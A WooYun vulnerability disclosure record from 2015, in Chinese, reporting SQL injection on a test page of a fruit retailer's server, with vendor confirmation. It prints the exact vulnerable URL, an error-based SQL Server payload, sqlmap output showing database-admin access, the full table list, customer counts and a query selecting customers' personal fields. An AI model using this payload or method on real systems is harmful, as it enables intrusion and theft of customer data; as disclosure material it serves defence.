{"id": 65509, "wybug_id": "wooyun-2015-0135150", "wybug_title": "天天果园某站存在SQL注入(可泄漏27W用户信息以及订单信息)", "wybug_corp": "fruitday.com", "wybug_author": "浮萍", "wybug_date": "2015-08-19 10:30", "wybug_open_date": "2015-10-03 11:44", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-08：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-18：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-03：\t细节向公众公开  简要描述： SQL注入漏洞 详细说明：  http://hq.fruitday.com:1300/test/\n\n刷新后抓post包\nhttp://hq.fruitday.com:1300/test/?Button1=%E5%AE%9D%E5%AE%9D%E6%A0%91%E8%AE%A2%E5%8D%95%E5%8F%91%E8%B4%A7%E4%BF%A1%E6%81%AF%E4%B8%8B%E8%BD%BD&__EVENTVALIDATION=%2FwEWBAKd1qmjCwLg2ZN%2BAsKGtEYCjOeKxgZbFZuhaBWiu7NPcvUNo8jE5zfxE0rx7qf7JmIw%2Fsj6SQ%3D%3D&__VIEWSTATE=%2FwEPDwULLTE3NTUxOTMwMTZkZFJW1VwGHd3j1GqENAXwHTs%2FMwjG%2BRntfJIDTWykxfY0&txtEndDate=2015-8-18&txtStartDate=2015-8-17\n\n\n输入'\n\n   漏洞证明：  测试注入点\nhttp://hq.fruitday.com:1300/test/?Button1=%E5%AE%9D%E5%AE%9D%E6%A0%91%E8%AE%A2%E5%8D%95%E5%8F%91%E8%B4%A7%E4%BF%A1%E6%81%AF%E4%B8%8B%E8%BD%BD&__EVENTVALIDATION=%2FwEWBAKd1qmjCwLg2ZN%2BAsKGtEYCjOeKxgZbFZuhaBWiu7NPcvUNo8jE5zfxE0rx7qf7JmIw%2Fsj6SQ%3D%3D&__VIEWSTATE=%2FwEPDwULLTE3NTUxOTMwMTZkZFJW1VwGHd3j1GqENAXwHTs%2FMwjG%2BRntfJIDTWykxfY0&txtEndDate=2015-8-18&txtStartDate=2015-8-17*\n\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: #1* (URI)    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: http://hq.fruitday.com:1300/test/?Button1=%E5%AE%9D%E5%AE%9D%E6%A0%91%E8%AE%A2%E5%8D%95%E5%8F%91%E8%B4%A7%E4%BF%A1%E6%81%AF%E4%B8%8B%E8%BD%BD&__EVENTVALIDATION=/wEWBAKd1qmjCwLg2ZN+AsKGtEYCjOeKxgZbFZuhaBWiu7NPcvUNo8jE5zfxE0rx7qf7JmIw/sj6SQ==&__VIEWSTATE=/wEPDwULLTE3NTUxOTMwMTZkZFJW1VwGHd3j1GqENAXwHTs/MwjG+RntfJIDTWykxfY0&txtEndDate=2015-8-18&txtStartDate=2015-08-17' AND 4689=CONVERT(INT,(SELECT CHAR(113)+CHAR(107)+CHAR(107)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (4689=4689) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(106)+CHAR(122)+CHAR(113))) AND 'RnJS'='RnJS---\n\nweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 6.0back-end DBMS: Microsoft SQL Server 2005\n数据库\navailable databases [5]:[*] fday[*] master[*] model[*] msdb[*] tempdb\n当前数据库\ncurrent database:    'fday'current user:    'sa'\n查看fday表\nDatabase: fday[99 tables]+----------------------------+| BagOpLog                   || CCBack                     || CancelQueue                || CardSales                  || Changes                    || CouponInputs               || CouponRequest              || CouponSales                || CouponSalesReturn          || DeliveryCar                || DeliveryOrder              || DeliveryWave               || Department                 || Enterprise                 || Gifts                      || InputOrderJson             || InvoiceReccord             || InvoiceRequest             || OkCardBill                 || OnlineBankBill             || OnlineCoupon               || OrderBak                   || Payments                   || PaymentsTemp               || PreSellRule                || Product                    || ProductItem                || ReChargeInvoice            || ReturnOrder                || ShouldTransferAccounts     || Staff                      || StateSyncQueue             || TmalJson                   || UnionPayBillDetails        || aa                         || dtproperties               || fruit_Activity             || fruit_ActivityOrderItem    || fruit_Bag                  || fruit_BagItem              || fruit_BagItemSet           || fruit_BagPkg               || fruit_BagType              || fruit_CC                   || fruit_Complaint            || fruit_ComplaintItem        || fruit_Coupon               || fruit_CouponType           || fruit_Customer             || fruit_DeliveryPerson       || fruit_ExtraOrderType       || fruit_ExtraTask            || fruit_ExtraTaskItem        || fruit_ExtraWarehouse       || fruit_GoldenCardBill       || fruit_GroupOrder           || fruit_GroupOrderItem       || fruit_Menu                 || fruit_OnlinePay            || fruit_OrderItemV2          || fruit_OrderModifyLog       || fruit_OrderOpRemark        || fruit_OrderPayInfo         || fruit_OrderPkg             || fruit_OrderSerial          || fruit_OrderV2              || fruit_PayMethodReccord     || fruit_PayMethodReccordV1   || fruit_PkgItem              || fruit_PkgType              || fruit_Po                   || fruit_PoInStockDetails     || fruit_PoItem               || fruit_ProdSingleReturn     || fruit_ProdType             || fruit_RefundRecord         || fruit_Stock                || fruit_Store                || fruit_StoreRequestBillItem || fruit_StoreRequestPkg      || fruit_StoreRequstBill      || fruit_SubMenu              || fruit_Supplier             || fruit_SupplierPayment      || fruit_SupplierProd         || fruit_UnPaidReccord        || fruit_User                 || fruit_UserMenu             || fruit_orderItemBak         || fruit_orderPayment         || material_RequestOrder      || material_RequestOrderItem  || preOrder                   || preOrderItem               || sysdiagrams                || tab_view_product_storage   || test1                      || view_OutPutStock           || view_ReturnProd_OrderNum   |+----------------------------+\n\nselect count(*) from fruit_Customer ;:    '276588'select count(*) from preOrder;:    '17019'select count(*) from fruit_User;:    '377'\n查看一条数据\nSELECT TOP 1 age_Range, custom_Address, custom_Level, custom_Mobile, custom_Name, custom_Remark, custom_Tel, custom_Type, department, eAddress, eName, enterprise_Id, id, lastorder_Time, order_Count, salesMan, sex  FROM fruit_Customer\n\n\norder应该是订单 stock是库存 staff应该就是员工其他的表就不查看   修复方案：     版权声明：转载请注明来源 浮萍@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-08-19 11:43 厂商回复： 非常感谢您提供的信息，我们会尽快确认。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}